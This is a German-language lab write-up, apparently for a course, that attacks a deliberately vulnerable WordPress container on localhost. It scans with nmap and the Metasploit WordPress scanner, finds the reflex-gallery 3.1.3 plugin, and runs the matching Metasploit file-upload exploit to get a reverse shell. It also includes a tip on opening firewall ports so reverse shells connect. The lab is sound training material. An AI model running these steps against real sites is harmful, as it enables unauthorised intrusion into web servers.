***
**Autor**: Manuel Fellner
**Version**: 30.04.2024

## 1. Vorbereitung

Als erstes müssen wir die Webanwendung erst einmal mittels Docker zum laufen bringen:
```shell
$ docker run -p 8080:80 chr0/wp_vuln:latest
```

Wenn wir dann zu `localhost:8080` navigieren, begegnen wir der folgenden wunderschönen Website:

![](https://uploads.mfellner.com/C3MgS7aZmejy.png)

## 2. Aufgabenstellung

### 2.1 Mittels NMAP offene Ports und die darauf laufenden Services ermitteln

Wir starten jetzt mittels `msfconsole` die Metasploit command line.
Mit dem folgenden Befehl scannen wir dann alle Ports und services am Localhost:

```shell
msf6 > nmap -v -sV 127.0.0.1
```

Wir bekommen dann folgende Ausgabe und sehen auch den `8080` Port unserer WordPress Anwendung:

![](https://uploads.mfellner.com/wZg7lhZouJ4f.png)

Folgende Ausgabe:

`8080/tcp open  http            Apache httpd 2.4.10 ((Debian))`

### 2.2 WordPress exploit suchen und ausnutzen

Nun ist es an der Zeit einen WordPress exploit zu suchen und auszunutzen.

Als nächstes suchen wir einmal alle Metasploit Einträge über WordPress:

```
msf6 > search exploit name:wordpress
```

Dies gibt uns die folgende Ausgabe:

![](https://uploads.mfellner.com/us5SVVQ9sTi1.png)

Die markierten Einträge sind jetzt wirklich spezifische Exploits.

Da wir jetzt wissen wie wir in Metasploit nach Exploits suchen, können wir uns einmal darauf konzentrieren, die Applikation genauer unter die Lupe zu nehmen.

Dies machen wir mit dem folgenden Metasploit Moduls: `auxiliary/scanner/http/wordpress_scanner`:

```shell
msf6 > use auxiliary/scanner/http/wordpress_scanner
# Damit kann man die Optionen bzw. Einstellungen des jeweiligen Moduls
# einsehen, wichtig sind hier z.B. rhosts und rport
msf6 auxiliary(scanner/http/wordpress_scanner) > options
# setzen der wichtigen Optionen:
msf6 auxiliary(scanner/http/wordpress_scanner) > set rhosts 127.0.0.1
msf6 auxiliary(scanner/http/wordpress_scanner) > set rport 8080

# Modul starten - scannen der Applikation
msf6 auxiliary(scanner/http/wordpress_scanner) > run
```

Mit diesem Befehl können wir uns jetzt Details wie z.B. die WordPress Version, die installierten Themes, die installierten Plugins, etc. ansehen.

Der spezifische Output ist hier der folgende:

![](https://uploads.mfellner.com/weTzLMEAdiMs.png)

Was wir hier interessantes sehen:
	- Ein installiertes, nämlich das `"reflex-gallery"` Plugin in der Version `3.1.3` wurde entedeckt 

Wenn wir jetzt ein bisschen recherchieren, finden wir schnell heraus, dass das Plugin einen [Arbitrary File Upload Exploit](https://www.exploit-db.com/exploits/36374) besitzt.
Suchen wir doch einmal mittels `search name: reflex` in Metasploit, ob es einen Exploit dafür gibt:

![](https://uploads.mfellner.com/ORFXSmBVrAqw.png)

Es gibt einen Exploit! Dann verwenden wir ihn einmal:

```shell
msf6 > use exploit/unix/webapp/wp_reflexgallery_file_upload
# Anzeigen der Optionen die gesetzt werden müssen/können
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > show options
# Setzen der benötigten Optionen
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set rhosts 127.0.0.1
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set rport 8080
# Starten des Exploits
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > run
```

> Notiz an mich selbst: Bei reverse shell exploits immer schauen, dass der Port auch von der Firewall freigegeben ist! Also lieber einmal mittels ufw status checken und/oder mittels ufw allow [port] erlauben. Ansonsten funktioniert die shell nicht!

Und wir bekommen den folgenden Output:

![](https://uploads.mfellner.com/PGFhGVhOaXp4.png)

Die reverse shell funktioniert! Nun befinden wir uns als Benutzer auf dem Webserver.

Damit wäre die GKv erfüllt!